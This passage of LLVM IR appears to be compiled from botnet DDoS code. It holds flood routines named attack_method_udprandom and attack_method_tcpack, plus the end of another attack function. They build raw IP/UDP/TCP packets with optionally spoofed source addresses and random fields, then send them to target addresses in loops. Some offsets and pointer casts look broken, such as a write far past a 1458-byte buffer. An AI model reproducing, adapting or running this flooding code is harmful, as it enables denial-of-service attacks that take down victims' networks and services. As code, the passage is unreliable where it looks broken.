  call void @util_memcpy(i8* %249, i8* %122, i32 2) #7
  br i1 %123, label %251, label %250

; <label>:250:                                    ; preds = %241
  call void @rand_str(i8* nonnull %189, i32 %24) #7
  br label %251

; <label>:251:                                    ; preds = %241, %250
  %252 = getelementptr inbounds i8, i8* %184, i64 10
  %253 = bitcast i8* %252 to i16*
  store i16 0, i16* %253, align 2
  %254 = bitcast i8* %184 to i16*
  %255 = call zeroext i16 @checksum_generic(i16* %254, i32 20) #7
  store i16 %255, i16* %253, align 2
  %256 = getelementptr inbounds i8, i8* %184, i64 48
  %257 = bitcast i8* %256 to i16*
  store i16 0, i16* %257, align 2
  %258 = bitcast i8* %186 to i16*
  %259 = call zeroext i16 @checksum_generic(i16* %258, i32 20) #7
  store i16 %259, i16* %257, align 2
  %260 = getelementptr inbounds i8, i8* %184, i64 64
  %261 = bitcast i8* %260 to i16*
  store i16 0, i16* %261, align 2
  %262 = getelementptr inbounds i8, i8* %184, i64 62
  %263 = bitcast i8* %262 to i16*
  %264 = load i16, i16* %263, align 2
  %265 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %187, i8* nonnull %188, i16 zeroext %264, i32 %124) #7
  store i16 %265, i16* %261, align 2
  %266 = load i32, i32* %5, align 4
  %267 = sext i32 %266 to i64
  %268 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %267, i32 0, i32 0
  store i16 2, i16* %268, align 4
  %269 = getelementptr inbounds i8, i8* %184, i64 16
  %270 = bitcast i8* %269 to i32*
  %271 = load i32, i32* %270, align 4
  %272 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %267, i32 0, i32 2, i32 0
  store i32 %271, i32* %272, align 4
  %273 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %267, i32 0, i32 1
  store i16 0, i16* %273, align 2
  %274 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %267, i32 0
  %275 = bitcast %struct.sockaddr_in* %274 to %struct.sockaddr*
  %276 = call i64 @sendto(i32 %31, i8* nonnull %184, i64 %.pre136, i32 16384, %struct.sockaddr* %275, i32 16) #7
  %277 = load i32, i32* %5, align 4
  %278 = add nsw i32 %277, 1
  store i32 %278, i32* %5, align 4
  %279 = icmp slt i32 %278, %37
  br i1 %279, label %.lr.ph, label %.loopexit.loopexit

; <label>:280:                                    ; preds = %4, %109
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udprandom(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #7
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 0)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 1458)
  %22 = trunc i32 %21 to i16
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %24 = trunc i32 %23 to i8
  %25 = load i32, i32* @LOCAL_ADDR, align 4
  %26 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %25)
  %27 = and i32 %21, 65535
  %28 = icmp ugt i32 %27, 1458
  %. = select i1 %28, i16 1458, i16 %22
  %29 = tail call i32 @socket(i32 2, i32 3, i32 17) #7
  %30 = icmp eq i32 %29, -1
  br i1 %30, label %260, label %31

; <label>:31:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %32 = bitcast i32* %5 to i8*
  %33 = call i32 @setsockopt(i32 %29, i32 0, i32 3, i8* nonnull %32, i32 4) #7
  %34 = icmp eq i32 %33, -1
  br i1 %34, label %68, label %.preheader83

.preheader83:                                     ; preds = %31
  store i32 0, i32* %5, align 4
  %35 = zext i8 %0 to i32
  %36 = icmp eq i8 %0, 0
  br i1 %36, label %.preheader, label %.lr.ph85

.lr.ph85:                                         ; preds = %.preheader83
  %37 = add i16 %., 28
  %38 = icmp eq i8 %16, 0
  %39 = add i16 %., 8
  %40 = zext i8 %0 to i64
  br i1 %38, label %.lr.ph85.split.us.preheader, label %.lr.ph85.split.preheader

.lr.ph85.split.preheader:                         ; preds = %.lr.ph85
  br label %.lr.ph85.split

.lr.ph85.split.us.preheader:                      ; preds = %.lr.ph85
  br label %.lr.ph85.split.us

.lr.ph85.split.us:                                ; preds = %.lr.ph85.split.us.preheader, %.lr.ph85.split.us
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph85.split.us ], [ 0, %.lr.ph85.split.us.preheader ]
  %41 = call noalias i8* @calloc(i64 1458, i64 1) #7
  %42 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %41, i8** %42, align 8
  %43 = getelementptr inbounds i8, i8* %41, i64 20
  store i8 69, i8* %41, align 4
  %44 = getelementptr inbounds i8, i8* %41, i64 1
  store i8 %10, i8* %44, align 1
  %45 = call zeroext i16 @htons(i16 zeroext %37) #8
  %46 = getelementptr inbounds i8, i8* %41, i64 2
  %47 = bitcast i8* %46 to i16*
  store i16 %45, i16* %47, align 2
  %48 = call zeroext i16 @htons(i16 zeroext %12) #8
  %49 = getelementptr inbounds i8, i8* %41, i64 4
  %50 = bitcast i8* %49 to i16*
  store i16 %48, i16* %50, align 4
  %51 = getelementptr inbounds i8, i8* %41, i64 8
  store i8 %14, i8* %51, align 4
  %52 = getelementptr inbounds i8, i8* %41, i64 9
  store i8 17, i8* %52, align 1
  %53 = getelementptr inbounds i8, i8* %41, i64 12
  %54 = bitcast i8* %53 to i32*
  store i32 %26, i32* %54, align 4
  %55 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %56 = load i32, i32* %55, align 4
  %57 = getelementptr inbounds i8, i8* %41, i64 16
  %58 = bitcast i8* %57 to i32*
  store i32 %56, i32* %58, align 4
  %59 = call zeroext i16 @htons(i16 zeroext %18) #8
  %60 = bitcast i8* %43 to i16*
  store i16 %59, i16* %60, align 2
  %61 = call zeroext i16 @htons(i16 zeroext %20) #8
  %62 = getelementptr inbounds i8, i8* %41, i64 22
  %63 = bitcast i8* %62 to i16*
  store i16 %61, i16* %63, align 2
  %64 = call zeroext i16 @htons(i16 zeroext %39) #8
  %65 = getelementptr inbounds i8, i8* %41, i64 24
  %66 = bitcast i8* %65 to i16*
  store i16 %64, i16* %66, align 2
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %67 = icmp slt i64 %indvars.iv.next, %40
  br i1 %67, label %.lr.ph85.split.us, label %..preheader_crit_edge.loopexit

; <label>:68:                                     ; preds = %31
  %69 = call i32 @close(i32 %29) #7
  br label %260

..preheader_crit_edge.loopexit:                   ; preds = %.lr.ph85.split.us
  br label %..preheader_crit_edge

..preheader_crit_edge.loopexit97:                 ; preds = %.lr.ph85.split
  br label %..preheader_crit_edge

..preheader_crit_edge:                            ; preds = %..preheader_crit_edge.loopexit97, %..preheader_crit_edge.loopexit
  %.lcssa86.in = phi i64 [ %indvars.iv.next, %..preheader_crit_edge.loopexit ], [ %indvars.iv.next91, %..preheader_crit_edge.loopexit97 ]
  %.lcssa86 = trunc i64 %.lcssa86.in to i32
  store i32 %.lcssa86, i32* %5, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader83, %..preheader_crit_edge
  %70 = icmp eq i32 %26, -1
  %71 = and i32 %11, 65535
  %72 = icmp eq i32 %71, 65535
  %73 = and i32 %17, 65535
  %74 = icmp eq i32 %73, 65535
  %75 = and i32 %19, 65535
  %76 = icmp eq i32 %75, 65535
  %77 = icmp eq i8 %24, 0
  %78 = zext i16 %. to i64
  %79 = add nuw nsw i64 %78, 8
  %80 = trunc i64 %79 to i32
  %81 = add nuw nsw i64 %78, 28
  %82 = zext i16 %. to i32
  br label %.loopexit

.lr.ph85.split:                                   ; preds = %.lr.ph85.split.preheader, %.lr.ph85.split
  %indvars.iv90 = phi i64 [ %indvars.iv.next91, %.lr.ph85.split ], [ 0, %.lr.ph85.split.preheader ]
  %83 = call noalias i8* @calloc(i64 1458, i64 1) #7
  %84 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv90
  store i8* %83, i8** %84, align 8
  %85 = getelementptr inbounds i8, i8* %83, i64 20
  store i8 69, i8* %83, align 4
  %86 = getelementptr inbounds i8, i8* %83, i64 1
  store i8 %10, i8* %86, align 1
  %87 = call zeroext i16 @htons(i16 zeroext %37) #8
  %88 = getelementptr inbounds i8, i8* %83, i64 2
  %89 = bitcast i8* %88 to i16*
  store i16 %87, i16* %89, align 2
  %90 = call zeroext i16 @htons(i16 zeroext %12) #8
  %91 = getelementptr inbounds i8, i8* %83, i64 4
  %92 = bitcast i8* %91 to i16*
  store i16 %90, i16* %92, align 4
  %93 = getelementptr inbounds i8, i8* %83, i64 8
  store i8 %14, i8* %93, align 4
  %94 = call zeroext i16 @htons(i16 zeroext 16384) #8
  %95 = getelementptr inbounds i8, i8* %83, i64 6
  %96 = bitcast i8* %95 to i16*
  store i16 %94, i16* %96, align 2
  %97 = getelementptr inbounds i8, i8* %83, i64 9
  store i8 17, i8* %97, align 1
  %98 = getelementptr inbounds i8, i8* %83, i64 12
  %99 = bitcast i8* %98 to i32*
  store i32 %26, i32* %99, align 4
  %100 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv90, i32 1
  %101 = load i32, i32* %100, align 4
  %102 = getelementptr inbounds i8, i8* %83, i64 16
  %103 = bitcast i8* %102 to i32*
  store i32 %101, i32* %103, align 4
  %104 = call zeroext i16 @htons(i16 zeroext %18) #8
  %105 = bitcast i8* %85 to i16*
  store i16 %104, i16* %105, align 2
  %106 = call zeroext i16 @htons(i16 zeroext %20) #8
  %107 = getelementptr inbounds i8, i8* %83, i64 22
  %108 = bitcast i8* %107 to i16*
  store i16 %106, i16* %108, align 2
  %109 = call zeroext i16 @htons(i16 zeroext %39) #8
  %110 = getelementptr inbounds i8, i8* %83, i64 24
  %111 = bitcast i8* %110 to i16*
  store i16 %109, i16* %111, align 2
  %indvars.iv.next91 = add nsw i64 %indvars.iv90, 1
  %112 = icmp slt i64 %indvars.iv.next91, %40
  br i1 %112, label %.lr.ph85.split, label %..preheader_crit_edge.loopexit97

.loopexit.loopexit:                               ; preds = %165
  br label %.loopexit.backedge

.loopexit.loopexit96:                             ; preds = %237
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %36, label %.loopexit.backedge, label %.lr.ph

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit, %.loopexit.loopexit96
  br label %.loopexit

.lr.ph:                                           ; preds = %.loopexit
  br i1 %70, label %.lr.ph.split.us.preheader, label %.lr.ph.split.preheader

.lr.ph.split.preheader:                           ; preds = %.lr.ph
  br label %.lr.ph.split

.lr.ph.split.us.preheader:                        ; preds = %.lr.ph
  br label %.lr.ph.split.us

.lr.ph.split.us:                                  ; preds = %.lr.ph.split.us.preheader, %165
  %storemerge8284.us = phi i32 [ %186, %165 ], [ 0, %.lr.ph.split.us.preheader ]
  %113 = sext i32 %storemerge8284.us to i64
  %114 = getelementptr inbounds i8*, i8** %8, i64 %113
  %115 = load i8*, i8** %114, align 8
  %116 = bitcast i8* %115 to %struct.iphdr*
  %117 = getelementptr inbounds i8, i8* %115, i64 20
  %118 = call i32 @rand() #7
  %119 = srem i32 %118, 4096
  %120 = add nsw i32 %119, 1
  %121 = sext i32 %120 to i64
  %122 = inttoptr i64 %121 to i8*
  %123 = load i32, i32* %5, align 4
  %124 = sext i32 %123 to i64
  %125 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %124, i32 2
  %126 = load i8, i8* %125, align 4
  %127 = icmp ult i8 %126, 32
  br i1 %127, label %128, label %143

; <label>:128:                                    ; preds = %.lr.ph.split.us
  %129 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %124, i32 1
  %130 = load i32, i32* %129, align 4
  %131 = call i32 @ntohl(i32 %130) #8
  %132 = call i32 @rand_next() #7
  %133 = load i32, i32* %5, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %134, i32 2
  %136 = load i8, i8* %135, align 4
  %137 = zext i8 %136 to i32
  %138 = lshr i32 %132, %137
  %139 = add i32 %138, %131
  %140 = call i32 @htonl(i32 %139) #8
  %141 = getelementptr inbounds i8, i8* %115, i64 16
  %142 = bitcast i8* %141 to i32*
  store i32 %140, i32* %142, align 4
  br label %143

; <label>:143:                                    ; preds = %.lr.ph.split.us, %128
  %144 = call i32 @rand_next() #7
  %145 = getelementptr inbounds i8, i8* %115, i64 12
  %146 = bitcast i8* %145 to i32*
  store i32 %144, i32* %146, align 4
  br i1 %72, label %147, label %152

; <label>:147:                                    ; preds = %143
  %148 = call i32 @rand_next() #7
  %149 = trunc i32 %148 to i16
  %150 = getelementptr inbounds i8, i8* %115, i64 4
  %151 = bitcast i8* %150 to i16*
  store i16 %149, i16* %151, align 4
  br label %152

; <label>:152:                                    ; preds = %147, %143
  br i1 %74, label %153, label %157

; <label>:153:                                    ; preds = %152
  %154 = call i32 @rand_next() #7
  %155 = trunc i32 %154 to i16
  %156 = bitcast i8* %117 to i16*
  store i16 %155, i16* %156, align 2
  br label %157

; <label>:157:                                    ; preds = %153, %152
  br i1 %76, label %158, label %163

; <label>:158:                                    ; preds = %157
  %159 = call i32 @rand_next() #7
  %160 = trunc i32 %159 to i16
  %161 = getelementptr inbounds i8, i8* %115, i64 22
  %162 = bitcast i8* %161 to i16*
  store i16 %160, i16* %162, align 2
  br label %163

; <label>:163:                                    ; preds = %158, %157
  br i1 %77, label %165, label %164

; <label>:164:                                    ; preds = %163
  call void @rand_str(i8* %122, i32 %82) #7
  br label %165

; <label>:165:                                    ; preds = %164, %163
  %166 = getelementptr inbounds i8, i8* %115, i64 10
  %167 = bitcast i8* %166 to i16*
  store i16 0, i16* %167, align 2
  %168 = bitcast i8* %115 to i16*
  %169 = call zeroext i16 @checksum_generic(i16* %168, i32 20) #7
  store i16 %169, i16* %167, align 2
  %170 = getelementptr inbounds i8, i8* %115, i64 26
  %171 = bitcast i8* %170 to i16*
  store i16 0, i16* %171, align 2
  %172 = getelementptr inbounds i8, i8* %115, i64 24
  %173 = bitcast i8* %172 to i16*
  %174 = load i16, i16* %173, align 2
  %175 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %116, i8* nonnull %117, i16 zeroext %174, i32 %80) #7
  store i16 %175, i16* %171, align 2
  %176 = getelementptr inbounds i8, i8* %115, i64 22
  %177 = bitcast i8* %176 to i16*
  %178 = load i16, i16* %177, align 2
  %179 = load i32, i32* %5, align 4
  %180 = sext i32 %179 to i64
  %181 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %180, i32 0, i32 1
  store i16 %178, i16* %181, align 2
  %182 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %180, i32 0
  %183 = bitcast %struct.sockaddr_in* %182 to %struct.sockaddr*
  %184 = call i64 @sendto(i32 %29, i8* nonnull %115, i64 %81, i32 16384, %struct.sockaddr* %183, i32 16) #7
  %185 = load i32, i32* %5, align 4
  %186 = add nsw i32 %185, 1
  store i32 %186, i32* %5, align 4
  %187 = icmp slt i32 %186, %35
  br i1 %187, label %.lr.ph.split.us, label %.loopexit.loopexit

.lr.ph.split:                                     ; preds = %.lr.ph.split.preheader, %237
  %storemerge8284 = phi i32 [ %258, %237 ], [ 0, %.lr.ph.split.preheader ]
  %188 = sext i32 %storemerge8284 to i64
  %189 = getelementptr inbounds i8*, i8** %8, i64 %188
  %190 = load i8*, i8** %189, align 8
  %191 = bitcast i8* %190 to %struct.iphdr*
  %192 = getelementptr inbounds i8, i8* %190, i64 20
  %193 = call i32 @rand() #7
  %194 = srem i32 %193, 4096
  %195 = add nsw i32 %194, 1
  %196 = sext i32 %195 to i64
  %197 = inttoptr i64 %196 to i8*
  %198 = load i32, i32* %5, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %199, i32 2
  %201 = load i8, i8* %200, align 4
  %202 = icmp ult i8 %201, 32
  br i1 %202, label %203, label %218

; <label>:203:                                    ; preds = %.lr.ph.split
  %204 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %199, i32 1
  %205 = load i32, i32* %204, align 4
  %206 = call i32 @ntohl(i32 %205) #8
  %207 = call i32 @rand_next() #7
  %208 = load i32, i32* %5, align 4
  %209 = sext i32 %208 to i64
  %210 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %209, i32 2
  %211 = load i8, i8* %210, align 4
  %212 = zext i8 %211 to i32
  %213 = lshr i32 %207, %212
  %214 = add i32 %213, %206
  %215 = call i32 @htonl(i32 %214) #8
  %216 = getelementptr inbounds i8, i8* %190, i64 16
  %217 = bitcast i8* %216 to i32*
  store i32 %215, i32* %217, align 4
  br label %218

; <label>:218:                                    ; preds = %.lr.ph.split, %203
  br i1 %72, label %219, label %224

; <label>:219:                                    ; preds = %218
  %220 = call i32 @rand_next() #7
  %221 = trunc i32 %220 to i16
  %222 = getelementptr inbounds i8, i8* %190, i64 4
  %223 = bitcast i8* %222 to i16*
  store i16 %221, i16* %223, align 4
  br label %224

; <label>:224:                                    ; preds = %219, %218
  br i1 %74, label %225, label %229

; <label>:225:                                    ; preds = %224
  %226 = call i32 @rand_next() #7
  %227 = trunc i32 %226 to i16
  %228 = bitcast i8* %192 to i16*
  store i16 %227, i16* %228, align 2
  br label %229

; <label>:229:                                    ; preds = %225, %224
  br i1 %76, label %230, label %235

; <label>:230:                                    ; preds = %229
  %231 = call i32 @rand_next() #7
  %232 = trunc i32 %231 to i16
  %233 = getelementptr inbounds i8, i8* %190, i64 22
  %234 = bitcast i8* %233 to i16*
  store i16 %232, i16* %234, align 2
  br label %235

; <label>:235:                                    ; preds = %230, %229
  br i1 %77, label %237, label %236

; <label>:236:                                    ; preds = %235
  call void @rand_str(i8* %197, i32 %82) #7
  br label %237

; <label>:237:                                    ; preds = %235, %236
  %238 = getelementptr inbounds i8, i8* %190, i64 10
  %239 = bitcast i8* %238 to i16*
  store i16 0, i16* %239, align 2
  %240 = bitcast i8* %190 to i16*
  %241 = call zeroext i16 @checksum_generic(i16* %240, i32 20) #7
  store i16 %241, i16* %239, align 2
  %242 = getelementptr inbounds i8, i8* %190, i64 26
  %243 = bitcast i8* %242 to i16*
  store i16 0, i16* %243, align 2
  %244 = getelementptr inbounds i8, i8* %190, i64 24
  %245 = bitcast i8* %244 to i16*
  %246 = load i16, i16* %245, align 2
  %247 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %191, i8* %192, i16 zeroext %246, i32 %80) #7
  store i16 %247, i16* %243, align 2
  %248 = getelementptr inbounds i8, i8* %190, i64 22
  %249 = bitcast i8* %248 to i16*
  %250 = load i16, i16* %249, align 2
  %251 = load i32, i32* %5, align 4
  %252 = sext i32 %251 to i64
  %253 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %252, i32 0, i32 1
  store i16 %250, i16* %253, align 2
  %254 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %252, i32 0
  %255 = bitcast %struct.sockaddr_in* %254 to %struct.sockaddr*
  %256 = call i64 @sendto(i32 %29, i8* %190, i64 %81, i32 16384, %struct.sockaddr* %255, i32 16) #7
  %257 = load i32, i32* %5, align 4
  %258 = add nsw i32 %257, 1
  store i32 %258, i32* %5, align 4
  %259 = icmp slt i32 %258, %35
  br i1 %259, label %.lr.ph.split, label %.loopexit.loopexit96

; <label>:260:                                    ; preds = %4, %68
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpack(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #7
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 0)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 17, i32 65535)
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 18, i32 65535)
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 11, i32 0)
  %24 = trunc i32 %23 to i16
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 12, i32 1)
  %26 = trunc i32 %25 to i16
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 13, i32 0)
  %28 = trunc i32 %27 to i8
  %29 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 14, i32 0)
  %30 = trunc i32 %29 to i16
  %31 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 15, i32 0)
  %32 = trunc i32 %31 to i16
  %33 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 16, i32 0)
  %34 = trunc i32 %33 to i16
  %35 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 1458)
  %36 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %37 = trunc i32 %36 to i8
  %38 = load i32, i32* @LOCAL_ADDR, align 4
  %39 = tail call i32 @attack_get_opt_ip(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %38)
  %40 = tail call i32 @socket(i32 2, i32 3, i32 6) #7
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %330, label %42

; <label>:42:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %43 = bitcast i32* %5 to i8*
  %44 = call i32 @setsockopt(i32 %40, i32 0, i32 3, i8* nonnull %43, i32 4) #7
  %45 = icmp eq i32 %44, -1
  br i1 %45, label %115, label %.preheader127

.preheader127:                                    ; preds = %42
  store i32 0, i32* %5, align 4
  %46 = zext i8 %0 to i32
  %47 = icmp eq i8 %0, 0
  br i1 %47, label %.preheader, label %.lr.ph129

.lr.ph129:                                        ; preds = %.preheader127
  %48 = trunc i32 %35 to i16
  %49 = add i16 %48, 40
  %50 = icmp eq i8 %16, 0
  %51 = trunc i32 %21 to i16
  %52 = shl i16 %24, 13
  %53 = and i16 %52, 8192
  %54 = shl i16 %26, 12
  %55 = and i16 %54, 4096
  %56 = and i8 %28, 1
  %57 = zext i8 %56 to i16
  %58 = shl nuw nsw i16 %57, 11
  %59 = shl i16 %30, 10
  %60 = and i16 %59, 1024
  %61 = shl i16 %32, 9
  %62 = and i16 %61, 512
  %63 = shl i16 %34, 8
  %64 = and i16 %63, 256
  %65 = or i16 %53, %55
  %66 = or i16 %65, %58
  %67 = or i16 %66, %60
  %.masked = or i16 %67, %62
  %68 = or i16 %.masked, %64
  %69 = or i16 %68, 80
  %70 = icmp eq i8 %28, 0
  br i1 %50, label %.lr.ph129.split.us.preheader, label %.lr.ph129.split.preheader

.lr.ph129.split.preheader:                        ; preds = %.lr.ph129
  br label %.lr.ph129.split

.lr.ph129.split.us.preheader:                     ; preds = %.lr.ph129
  br label %.lr.ph129.split.us

.lr.ph129.split.us:                               ; preds = %.lr.ph129.split.us.preheader, %111
  %71 = phi i32 [ %113, %111 ], [ 0, %.lr.ph129.split.us.preheader ]
  %72 = call noalias i8* @calloc(i64 1458, i64 1) #7
  %73 = sext i32 %71 to i64
  %74 = getelementptr inbounds i8*, i8** %8, i64 %73
  store i8* %72, i8** %74, align 8
  %75 = getelementptr inbounds i8, i8* %72, i64 20
  %76 = getelementptr inbounds i8, i8* %72, i64 10260
  store i8 69, i8* %72, align 4
  %77 = getelementptr inbounds i8, i8* %72, i64 1
  store i8 %10, i8* %77, align 1
  %78 = call zeroext i16 @htons(i16 zeroext %49) #8
  %79 = getelementptr inbounds i8, i8* %72, i64 2
  %80 = bitcast i8* %79 to i16*
  store i16 %78, i16* %80, align 2
  %81 = call zeroext i16 @htons(i16 zeroext %12) #8
  %82 = getelementptr inbounds i8, i8* %72, i64 4
  %83 = bitcast i8* %82 to i16*
  store i16 %81, i16* %83, align 4
  %84 = getelementptr inbounds i8, i8* %72, i64 8
  store i8 %14, i8* %84, align 4
  %85 = getelementptr inbounds i8, i8* %72, i64 9
  store i8 6, i8* %85, align 1
  %86 = getelementptr inbounds i8, i8* %72, i64 12
  %87 = bitcast i8* %86 to i32*
  store i32 %39, i32* %87, align 4
  %88 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %73, i32 1
  %89 = load i32, i32* %88, align 4
  %90 = getelementptr inbounds i8, i8* %72, i64 16
  %91 = bitcast i8* %90 to i32*
  store i32 %89, i32* %91, align 4
  %92 = call zeroext i16 @htons(i16 zeroext %18) #8
  %93 = bitcast i8* %75 to i16*
  store i16 %92, i16* %93, align 4
  %94 = call zeroext i16 @htons(i16 zeroext %20) #8
  %95 = getelementptr inbounds i8, i8* %72, i64 22
  %96 = bitcast i8* %95 to i16*
  store i16 %94, i16* %96, align 2
  %97 = call zeroext i16 @htons(i16 zeroext %51) #8
  %98 = zext i16 %97 to i32
  %99 = getelementptr inbounds i8, i8* %72, i64 24
  %100 = bitcast i8* %99 to i32*
  store i32 %98, i32* %100, align 4
  %101 = getelementptr inbounds i8, i8* %72, i64 32
  %102 = bitcast i8* %101 to i16*
  store i16 %69, i16* %102, align 4
  %103 = call i32 @rand() #7
  %104 = srem i32 %103, 65535
  %105 = trunc i32 %104 to i16
  %106 = getelementptr inbounds i8, i8* %72, i64 34
  %107 = bitcast i8* %106 to i16*
  store i16 %105, i16* %107, align 2
  br i1 %70, label %111, label %108

; <label>:108:                                    ; preds = %.lr.ph129.split.us
  %109 = load i16, i16* %102, align 4
  %110 = or i16 %109, 2048
  store i16 %110, i16* %102, align 4
  br label %111

; <label>:111:                                    ; preds = %108, %.lr.ph129.split.us
  call void @rand_str(i8* nonnull %76, i32 %35) #7
  %112 = load i32, i32* %5, align 4
  %113 = add nsw i32 %112, 1
  store i32 %113, i32* %5, align 4
  %114 = icmp slt i32 %113, %46
  br i1 %114, label %.lr.ph129.split.us, label %.preheader.loopexit

; <label>:115:                                    ; preds = %42
  %116 = call i32 @close(i32 %40) #7
  br label %330

.preheader.loopexit:                              ; preds = %111
  br label %.preheader

.preheader.loopexit137:                           ; preds = %175
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit137, %.preheader.loopexit, %.preheader127
  %117 = icmp eq i32 %39, -1
  %118 = and i32 %11, 65535
  %119 = icmp eq i32 %118, 65535
  %120 = and i32 %17, 65535
  %121 = icmp eq i32 %120, 65535
  %122 = and i32 %19, 65535
  %123 = icmp eq i32 %122, 65535
  %124 = icmp eq i32 %21, 65535
  %125 = icmp eq i32 %22, 65535
  %126 = icmp eq i8 %37, 0
  %127 = sext i32 %35 to i64
  %128 = add nsw i64 %127, 20
  %129 = trunc i64 %128 to i16
  %130 = trunc i64 %128 to i32
  %131 = add nsw i64 %127, 40
  br label %.loopexit

.lr.ph129.split:                                  ; preds = %.lr.ph129.split.preheader, %175
  %132 = phi i32 [ %177, %175 ], [ 0, %.lr.ph129.split.preheader ]
  %133 = call noalias i8* @calloc(i64 1458, i64 1) #7
  %134 = sext i32 %132 to i64
  %135 = getelementptr inbounds i8*, i8** %8, i64 %134
  store i8* %133, i8** %135, align 8
  %136 = getelementptr inbounds i8, i8* %133, i64 20
  %137 = getelementptr inbounds i8, i8* %133, i64 10260
  store i8 69, i8* %133, align 4
  %138 = getelementptr inbounds i8, i8* %133, i64 1
  store i8 %10, i8* %138, align 1
